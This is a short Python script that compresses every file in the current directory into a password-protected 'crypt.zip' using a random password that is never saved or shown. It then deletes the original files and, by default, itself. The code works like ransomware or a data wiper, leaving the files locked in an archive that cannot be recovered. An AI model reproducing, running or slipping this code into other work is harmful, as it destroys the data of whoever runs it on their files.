import glob,os,pyminizip,random



def generate_password():
        pos = 'qazwsxedcrfvtgbyhnujmikolp1234567890~`!@#$%^&*()}{][/<>?;'
        result = ''
        
        for x in range(8):
            result += pos[random.randint(0,10000) % len(pos) - 1]

        return result

files = []
for file in glob.glob("*.*"):
    files.append(file)

dst_file = 'crypt.zip'
password = generate_password()
level = random.randint(0,1000000) % 10

pyminizip.compress_multiple(files,[],dst_file,password,level)

for file in files:
    #if file == __file__:               If you don't want to delete the script uncomment this
        #continue
    os.remove(file)
